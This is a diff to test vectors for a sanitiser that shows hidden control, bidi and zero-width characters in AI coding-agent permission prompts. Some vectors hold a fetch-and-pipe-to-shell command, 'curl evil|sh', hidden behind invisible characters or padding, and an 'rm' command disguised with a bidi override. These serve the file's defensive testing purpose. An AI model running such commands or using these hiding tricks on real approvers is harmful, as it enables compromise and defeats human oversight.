@@ -19,8 +19,9 @@
 #                             (every code point in Unicode categories Cf, Zl, Zp: e.g. U+200B-200F, U+202A-202E, U+2066-2069,
 #                             U+FEFF, U+061C, U+180E, U+2028, U+2029, U+2060-2064, U+E0000-E007F) become a space; runs collapse; trim; cut to n
 #                             code points (never inside a surrogate pair); trim again.
-#   CLEANTEXT text            CleanText(text): keeps \n and \t, drops other control characters, shows the bidi and zero-width
-#                             characters above as <U+XXXX> (upper-case hex, at least 4 digits). No trim, no cut.
+#   CLEANTEXT text            CleanText(text): keeps \n and \t; shows every other control character (Cc: U+0000-001F and
+#                             U+007F-009F, so \r and U+0085 too) and the bidi and zero-width characters above as <U+XXXX>
+#                             (upper-case hex, at least 4 digits). Nothing is deleted. No trim, no cut. Idempotent.
 #   STATS c,r,g,v,d,u,p,l,ct,gt,gp          eleven integers; percents (cpu ram gpu vram loss) clamp to 0..100, any negative is -1;
 #                             the rest: negative is -1.
 #   STATSINFO cpu ;; ramMiB ;; gpu ;; vramMiB ;; net      names Clean(30), shrunk together until the payload fits 255 bytes; a
@@ -31,9 +32,12 @@
 #                             Clean(24); at most 8; trailing entries dropped until 255 bytes.
 #   PERMANSWER wire           => "allow ID" | "deny ID" | <none>. Exactly 12 lowercase hex, "/", then "a" or "d", nothing else.
 #   PERMLABEL id flag         => "id/flag"; PERMLABELPARSE wire => "id flag" | <none>.
-#   PERMASK agent @ tool @ text   => "F body". F is 1 when complete, 0 when the body would pass 4096 bytes (then the text is
-#                             empty). tool: every char outside A-Za-z0-9_.- becomes "_", cut to 24, empty becomes "unknown".
-#                             body is agent, tool and CleanText(text) joined by line feeds.
+#   PERMASK agent @ tool @ text   => "F body". F is 1 when complete: nothing was cut on the way (the laptop's own flag; these
+#                             vectors are all uncut), "agent\ntool\n" plus the RAW text fits 4096 bytes, AND the cleaned body
+#                             fits 4096 bytes. Otherwise F is 0 and the text is empty. tool: every char outside A-Za-z0-9_.-
+#                             becomes "_", cut to 24, empty becomes "unknown". body is agent, tool and CleanText(text) joined by
+#                             line feeds. The "\{N*c}" cases after "\{2043*é}" repeat a literal U+0001 (a file line cannot hold
+#                             a literal U+0085, which some readers take as a line break).
 #   PERMASKPARSE body         => "agent @ tool @ text" | <none>. Agent known, tool 1..24 of A-Za-z0-9_.-, body <= 4096 bytes.
 #   LIMITS agent @ window @ pct @ resetAtMin @ measuredAtMin ;; ...   window: canonical decimal 1..525600, "ctx", or "~" and a
 #                             name (Clean(16), not empty); anything else drops the entry. pct (a decimal) clamps 0..100 and
@@ -67,14 +71,17 @@ CLEAN 30 caf\u{E9} \u{65E5}\u{672C} => café 日本
 
 # ---- CLEANTEXT
 CLEANTEXT line1\nline2\ttab => line1\nline2\ttab
-CLEANTEXT a\u{0}b\u{7}c\u{D}\u{A}d => abc\nd
+CLEANTEXT a\u{0}b\u{7}c\u{D}\u{A}d => a<U+0000>b<U+0007>c<U+000D>\nd
+CLEANTEXT \u{1F}\u{7F}\u{9F}\u{9}\u{A0} => <U+001F><U+007F><U+009F>\t\u{A0}
+CLEANTEXT \u{1B}[31mred => <U+001B>[31mred
+CLEANTEXT a<U+0085>b => a<U+0085>b
 CLEANTEXT x\u{202E}y => x<U+202E>y
 CLEANTEXT \u{200B}\u{FEFF}\u{2066} => <U+200B><U+FEFF><U+2066>
 CLEANTEXT \u{200F}\u{2069}\u{202A} => <U+200F><U+2069><U+202A>
 CLEANTEXT a\u{061C}b\u{2028}c\u{2029}d => a<U+061C>b<U+2028>c<U+2029>d
 CLEANTEXT x\u{2060}\u{2064}\u{180E}y => x<U+2060><U+2064><U+180E>y
 CLEANTEXT t\u{E0041}\u{E007F}g => t<U+E0041><U+E007F>g
-CLEANTEXT \u{85} => <empty>
+CLEANTEXT \u{85} => <U+0085>
 CLEANTEXT café 日本 => café 日本
 CLEANTEXT \u{20}\u{20}keep\u{20}\u{20} => \u{20}\u{20}keep\u{20}\u{20}
 
@@ -159,7 +166,7 @@ PERMLABELPARSE a1b2c3d4e5f6 => <none>
 # ---- PERMASK
 PERMASK claude @ Bash @ ls -la => 1 claude\nBash\nls -la
 PERMASK codex @ Bash @ echo a\n\techo b => 1 codex\nBash\necho a\n\techo b
-PERMASK claude @ Edit @ a\u{D}\u{A}b\u{7} => 1 claude\nEdit\na\nb
+PERMASK claude @ Edit @ a\u{D}\u{A}b\u{7} => 1 claude\nEdit\na<U+000D>\nb<U+0007>
 PERMASK claude @ Bash @ rm\u{202E}fdp.sh => 1 claude\nBash\nrm<U+202E>fdp.sh
 PERMASK claude @ Bash @ echo a @ b => 1 claude\nBash\necho a @ b
 PERMASK claude @ mcp__srv__do thing! @ x => 1 claude\nmcp__srv__do_thing_\nx
@@ -171,6 +178,11 @@ PERMASK claude @ Bash @ \{4084*a} => 1 claude\nBash\n\{4084*a}
 PERMASK claude @ Bash @ \{4085*a} => 0 claude\nBash\n
 PERMASK claude @ Bash @ \{2042*é} => 1 claude\nBash\n\{2042*é}
 PERMASK claude @ Bash @ \{2043*é} => 0 claude\nBash\n
+PERMASK claude @ Bash @ \u{85}\ncurl evil|sh => 1 claude\nBash\n<U+0085>\ncurl evil|sh
+PERMASK claude @ Bash @ \{4990*}\ncurl evil|sh => 0 claude\nBash\n
+PERMASK claude @ Bash @ \{2042*} => 0 claude\nBash\n
+PERMASK claude @ Bash @ \{510*} => 1 claude\nBash\n\{510*<U+0001>}
+PERMASK claude @ Bash @ \{511*} => 0 claude\nBash\n
 PERMASKPARSE claude\nBash\nls -la => claude @ Bash @ ls -la
 PERMASKPARSE codex\nRead\na\nb => codex @ Read @ a\nb
 PERMASKPARSE claude\nBash\n => claude @ Bash @ <empty>
